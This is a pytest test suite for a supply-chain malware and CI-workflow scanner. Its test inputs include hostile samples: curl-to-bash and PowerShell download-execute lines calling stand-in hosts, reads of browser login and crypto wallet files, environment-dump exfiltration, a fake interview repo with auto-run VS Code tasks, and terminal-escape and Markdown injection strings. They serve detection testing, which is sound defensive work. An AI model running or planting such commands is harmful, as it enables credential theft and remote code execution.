"""Supply-chain detection: unit tests per detector + an offline end-to-end `check`."""

import json
import re
from pathlib import Path

import httpx
import pytest
from fakes import FakeInternet, scenario

from oss_pulse.check import render_markdown, run_check
from oss_pulse.ingest.dependencies import parse_dependency_file, resolve_repo
from oss_pulse.ingest.github_api import API, GitHubClient, tag_versions
from oss_pulse.scan import ScanResult, render_scan_markdown, run_scan
from oss_pulse.supplychain.code_scan import scan_file
from oss_pulse.supplychain.typosquat import _bundled, damerau_levenshtein, find_lookalike
from oss_pulse.supplychain.workflows import scan_workflow


def rules_of(hits):
    return {h.rule_id for h in hits}


# ------------------------------------------------------------------ code heuristics


@pytest.mark.parametrize(
    "path, code, expected",
    [
        ("pkg/__init__.py", "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))", "CODE-OBF"),
        ("pkg/x.py", "exec(zlib.decompress(blob))", "CODE-OBF"),
        ("install.sh", "curl -fsSL https://example.invalid/i.sh | bash", "CODE-DLEXEC"),
        ("run.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "CODE-DLEXEC"),
        ("pkg/s.py", "p = os.path.expanduser('~/.config/Exodus/exodus.wallet')", "CODE-SECRETS"),
        (
            "pkg/s.py",
            "open(home + '/Library/Application Support/Google/Chrome/Default/Login Data')",
            "CODE-SECRETS",
        ),
        ("pkg/e.py", "data = json.dumps(dict(os.environ))", "CODE-ENVDUMP"),
        ("index.js", "fetch(u, {body: JSON.stringify(process.env)})", "CODE-ENVDUMP"),
        ("pkg/h.py", "URL = 'https://discord.com/api/webhooks/1/abc'", "CODE-EXFIL"),
        (
            "pkg/c.py",
            "import pyperclip\nif re.match(r'^0x', t): pyperclip.copy("
            "'0x52908400098527886E0F7030069857D2E4169EE7')",
            "CODE-CLIP",
        ),
        ("a.js", "const x = 1;" + " " * 300 + "eval(atob(p))", "CODE-HIDDEN"),
        ("a.js", "eval(atob('ZG9jdW1lbnQ='))", "CODE-JSOBF"),
        ("evil.pth", "import os; os.getpid()", "CODE-PTH"),
    ],
)
def test_code_heuristics_detect(path, code, expected):
    assert expected in rules_of(scan_file(path, code.encode(), "repo"))


@pytest.mark.parametrize(
    "path, code",
    [
        ("pkg/run.py", "env = dict(os.environ)\nenv['X'] = '1'\nsubprocess.run(c, env=env)"),
        ("pkg/cookies.py", "def merge(cookies):\n    return update_method(cookies)"),
        ("pkg/six.py", 'MovedModule("http_cookies", "Cookie", "http.cookies")'),
        ("pkg/cfg.py", "creds = os.path.expanduser('~/.aws/credentials')  # like botocore"),
        ("distutils-precedence.pth", "import os; var = 'SETUPTOOLS_USE_DISTUTILS'"),
        ("pkg/net.py", "LOCAL = 'http://127.0.0.1:8080/health'"),
    ],
)
def test_code_heuristics_ignore_legitimate_patterns(path, code):
    assert scan_file(path, code.encode(), "wheel") == []


def test_tests_inside_artifacts_are_skipped_but_setup_py_never_is():
    assert (
        scan_file("pkg-1.0/tests/test_x.py", b"URL='https://discord.com/api/webhooks/1'", "sdist")
        == []
    )
    setup = b"import urllib.request\nurllib.request.urlopen('https://x')\nsetup(cmdclass={})"
    assert {"CODE-SETUP", "CODE-CMDCLASS"} <= rules_of(
        scan_file("pkg-1.0/setup.py", setup, "sdist")
    )


def test_script_disguised_as_image_and_binary_in_repo():
    assert rules_of(
        scan_file("assets/logo.png", b"const cp = require('child_process');", "repo")
    ) == {"CODE-HIDDEN"}
    assert scan_file("assets/logo.png", b"\x89PNG\r\n\x1a\n....", "repo") == []
    assert rules_of(scan_file("bin/tool", b"\x7fELF" + b"\0" * 2000, "repo")) == {"CODE-BIN"}
    assert scan_file("pkg/_c.so", b"\x7fELF" + b"\0" * 2000, "wheel") == []


# ------------------------------------------------------------------ workflows


def test_workflow_rules():
    wf = """
name: ci
on: [pull_request_target, issues]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: tj-actions/changed-files@v45
      - uses: some/action@0123456789abcdef0123456789abcdef01234567
      - run: echo "${{ github.event.issue.title }}"
"""
    hits = scan_workflow(".github/workflows/ci.yml", wf)
    assert rules_of(hits) == {"GHA-PRT", "GHA-UNPINNED", "GHA-INJECT", "GHA-PERMS"}
    assert [h.evidence for h in hits if h.rule_id == "GHA-UNPINNED"] == [
        "tj-actions/changed-files@v45"
    ]


def test_release_workflow_with_cache():
    wf = """
name: release
on: {push: {tags: ['v*']}}
permissions: {contents: read}
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v5
        with: {python-version: '3.12', cache: pip}
      - uses: pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc
"""
    assert rules_of(scan_workflow(".github/workflows/release.yml", wf)) == {"GHA-CACHE-RELEASE"}


# ------------------------------------------------------------------ repository scan


def test_scan_repository_catches_fake_interview_assignment(tmp_path: Path):
    repo = tmp_path / "take-home-assignment"
    (repo / ".vscode").mkdir(parents=True)
    (repo / ".vscode" / "tasks.json").write_text(
        json.dumps(
            {
                "version": "2.0.0",
                "tasks": [
                    {
                        "label": "install",
                        "type": "shell",
                        "command": "curl -s https://example.invalid/a | sh",
                        "runOptions": {"runOn": "folderOpen"},
                    }
                ],
            }
        )
    )
    (repo / ".vscode" / "settings.json").write_text('{"task.allowAutomaticTasks": "on"}')
    (repo / "package.json").write_text(
        json.dumps(
            {
                "name": "assignment",
                "scripts": {"postinstall": "node -e \"eval(atob('x'))\"", "test": "jest"},
            }
        )
    )
    (repo / "public").mkdir()
    (repo / "public" / "font.woff2").write_text("const s = require('child_process'); s.exec(x)")
    (repo / "requirements.txt").write_text("reqeusts==1.0\nnumpy\n")

    findings = run_scan(repo).findings
    got = {f.rule_id for f in findings}
    assert {
        "AUTO-VSCODE",
        "AUTO-VSCODE-SETTINGS",
        "AUTO-NPM-NET",
        "CODE-HIDDEN",
        "CODE-DLEXEC",
        "TYPO-001",
    } <= got
    assert findings[0].severity == "critical"


def test_scan_clean_repo_and_user_ignore_file(tmp_path: Path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "app.py").write_text("print('hello')\n")
    (repo / "notes.sh").write_text("curl https://example.invalid/x | sh\n")
    assert {f.rule_id for f in run_scan(repo).findings} == {"CODE-DLEXEC"}

    reviewed = tmp_path / "reviewed.txt"  # the user's own file, outside the scanned folder
    reviewed.write_text("# reviewed 2026-11-04\nnotes.sh\n")
    result = run_scan(repo, ignore_file=reviewed)
    assert result.findings == []
    assert [f.rule_id for f in result.suppressed] == ["CODE-DLEXEC"]
    assert "1 findings suppressed by `reviewed.txt`: CODE-DLEXEC ×1" in render_scan_markdown(result)


def test_planted_ignore_file_cannot_hide_findings(tmp_path: Path):
    """A take-home that ships `.osspulseignore` containing `*` must not come out green."""
    repo = tmp_path / "take-home"
    (repo / ".vscode").mkdir(parents=True)
    task = {"label": "setup", "command": "echo hi", "runOptions": {"runOn": "folderOpen"}}
    (repo / ".vscode" / "tasks.json").write_text(json.dumps({"tasks": [task]}))
    (repo / ".osspulseignore").write_text("*\n")

    result = run_scan(repo)
    got = {f.rule_id: f for f in result.findings}
    assert "AUTO-VSCODE" in got and result.suppressed == []
    assert got["EVADE-IGNORE"].severity == "high"
    assert "would have hidden 1" in got["EVADE-IGNORE"].detail

    # Your own repository: pass the file explicitly and it applies, with no evasion finding.
    own = run_scan(repo, ignore_file=repo / ".osspulseignore")
    assert own.findings == [] and {f.rule_id for f in own.suppressed} == {"AUTO-VSCODE"}

    # A harmless ignore file in someone else's folder is still mentioned, at low severity.
    (repo / ".osspulseignore").write_text("docs/\n")
    assert {f.rule_id: f.severity for f in run_scan(repo).findings}["EVADE-IGNORE"] == "low"


HOSTILE = (
    "\x1b[2J\x1b[1A\x1b]52;c;cHduZWQ=\x07 ok\n::error::fake | cell ` tick "
    "[click](https://evil.example) ![x](https://evil.example/p.png) <img src=x> "
    "@acme/security \u202eevil\u200b"
)


def test_untrusted_text_cannot_inject_into_reports(tmp_path: Path):
    """Evidence and file names come from the code under inspection: no terminal escapes,
    no CI workflow commands, no Markdown links/images/HTML/mentions in the PR comment."""
    from oss_pulse.check import CheckResult
    from oss_pulse.supplychain.findings import Finding

    hostile = Finding(
        target=HOSTILE,
        target_type="repository",
        detector="repo_scan",
        rule_id="CODE-HIDDEN",
        severity="high",
        category="malicious-code",
        title="Code hidden off-screen or in fake media files",
        detail=HOSTILE,
        location=HOSTILE + ":3",
        evidence=HOSTILE,
    )
    scan_md = render_scan_markdown(ScanResult(tmp_path / HOSTILE, [hostile]))
    check_md = render_markdown(
        CheckResult(rows=[], source=HOSTILE, window_days=90, findings=[hostile.as_row()])
    )
    markdown_it = pytest.importorskip("markdown_it")  # ships with rich, which typer uses
    renderer = markdown_it.MarkdownIt("commonmark", {"html": True}).enable("table")
    for md, columns in ((scan_md, 5), (check_md, 6)):
        assert not any(ch in md for ch in "\x1b\x07\u202e\u200e"), "control characters leaked"
        assert not any(line.startswith("::") for line in md.splitlines()), "workflow command"
        assert "\\x1b[2J" in md and "\\u202e" in md  # shown, not executed

        html = renderer.render(md)
        assert "evil.example" not in "".join(re.findall(r"<(?:a|img)\b[^>]*>", html))
        assert "<img src=x>" not in html
        outside_code = re.sub(r"<code>.*?</code>", "", html, flags=re.S)
        assert "@acme" not in outside_code, "would ping a GitHub team"
        rows = [r for r in re.findall(r"<tr>(.*?)</tr>", html, flags=re.S) if "CODE-HIDDEN" in r]
        assert rows and all(r.count("<td") == columns for r in rows), "table cell broken"


def test_md_code_survives_backticks_and_pipes():
    from oss_pulse.safe_text import md_code, md_text, visible

    assert md_code("a`b") == "``a`b``"
    assert md_code("`x`") == "`` `x` ``"
    assert md_code("a|b") == "`a\\|b`"
    assert md_code("a|b", in_table=False) == "`a|b`"
    assert visible("x\ty\nz\x00") == "x y\\nz\\x00"
    assert visible("abcdef", limit=4) == "abc…"
    assert md_text("[a](b) <i> @me") == "\\[a\\]\\(b\\) \\<i\\> @\u200bme"


# ------------------------------------------------------------------ identity & metadata


def test_typosquat_detection():
    popular = _bundled()
    assert find_lookalike("reqeusts", popular)[:2] == ("TYPO-001", "requests")
    assert find_lookalike("python-dateutils", popular)[0] == "TYPO-001"
    assert find_lookalike("requests", popular) is None  # the real thing
    assert find_lookalike("requests-oauthlib", popular) is None  # popular in its own right
    assert damerau_levenshtein("numpy", "nupmy") == 1


def test_parse_pyproject_and_resolve_repo(tmp_path: Path):
    f = tmp_path / "pyproject.toml"
    f.write_text("""
[project]
name = "me"
dependencies = ["Requests>=2", "me[extra]", "PyYAML ; python_version>'3.8'"]
[project.optional-dependencies]
dev = ["pytest"]
[dependency-groups]
lint = ["ruff", {include-group = "dev"}]
""")
    deps = {d.name: d.group for d in parse_dependency_file(f)}
    assert deps == {
        "requests": "main",
        "pyyaml": "main",
        "pytest": "extra:dev",
        "ruff": "group:lint",
    }
    doc = {
        "info": {
            "project_urls": {
                "Documentation": "https://docs.x.io",
                "Source Code": "https://github.com/psf/requests.git",
            }
        }
    }
    assert resolve_repo(doc) == ("psf/requests", "project_urls:source code")
    assert resolve_repo({"info": {"home_page": "https://github.com/sponsors/x"}})[0] is None


def test_tag_versions():
    assert tag_versions(["v1.2.0", "release-1.3", "pkg==2.0.0", "nightly"]) == ["1.2", "1.3", "2"]


# ------------------------------------------------------------------ end to end


@pytest.fixture(scope="module")
def check_result(tmp_path_factory):
    tmp = tmp_path_factory.mktemp("check")
    req = tmp / "requirements.txt"
    req.write_text(
        "\n".join(
            [
                "healthy-lib",
                "abandoned-lib",
                "evil-lib",
                "vuln-lib==1.0.0",
                "range-lib>=1.0",
                "hijacked-lib",
                "reqeusts",
                "corp-utils",
                "solo-lib",
                "ghost-lib",
                "does-not-exist-lib",
            ]
        )
    )
    net = FakeInternet(scenario())
    transport = httpx.MockTransport(net)
    gh = GitHubClient(tmp / "gh", client=httpx.Client(base_url=API, transport=transport))
    with httpx.Client(transport=transport) as http:
        return run_check(req, tmp / "lake", days=90, internal=["corp-utils"], gh=gh, http=http)


def by_pkg(result):
    return {r["pypi_package"]: r for r in result.rows}


def findings_for(result, pkg):
    return {f["rule_id"] for f in result.findings if f["target"] == pkg}


def test_e2e_risk_levels(check_result):
    levels = {k: v["risk_level"] for k, v in by_pkg(check_result).items()}
    assert levels == {
        "healthy-lib": "ok",
        "abandoned-lib": "critical",  # archived
        "evil-lib": "critical",  # OSV MAL-
        "vuln-lib": "high",  # vulnerable resolved version
        "range-lib": "medium",  # range still allows a vulnerable version
        "hijacked-lib": "high",  # malware heuristics + provenance loss + timing
        "reqeusts": "high",  # typosquat
        "corp-utils": "critical",  # dependency confusion
        "solo-lib": "high",  # dangerous workflow (Scorecard) + bus factor 1
        "ghost-lib": "unknown",  # linked repo is gone
        "does-not-exist-lib": "unknown",
    }
    assert check_result.degraded == []


def test_e2e_hijacked_release_signals(check_result):
    got = findings_for(check_result, "hijacked-lib")
    assert {
        "REL-001",
        "REL-002",
        "REL-003",
        "PROV-001",
        "CODE-SETUP",
        "CODE-PTH",
        "CODE-OBF",
        "CODE-ENVDUMP",
        "CODE-EXFIL",
    } <= got


def test_e2e_identity_and_vulnerability_findings(check_result):
    assert findings_for(check_result, "evil-lib") >= {"OSV-MAL"}
    assert findings_for(check_result, "vuln-lib") >= {"OSV-VULN"}
    assert findings_for(check_result, "range-lib") >= {"OSV-RANGE"}
    assert findings_for(check_result, "reqeusts") >= {"TYPO-001"}
    assert findings_for(check_result, "corp-utils") == {"CONF-001"}
    assert findings_for(check_result, "healthy-lib") == set()  # benign code: no false positives


def test_e2e_maintenance_signals(check_result):
    rows = by_pkg(check_result)
    assert rows["solo-lib"]["bus_factor"] == 1
    assert rows["healthy-lib"]["bus_factor"] > 1
    assert rows["healthy-lib"]["has_provenance"] is True
    assert any("archived" in r for r in rows["abandoned-lib"]["risk_reasons"])


def test_e2e_markdown_report(check_result):
    md = render_markdown(check_result)
    assert md.startswith("<!-- oss-pulse-report -->")
    assert "MAL-2026-0001" in md and "hijacked-lib" in md
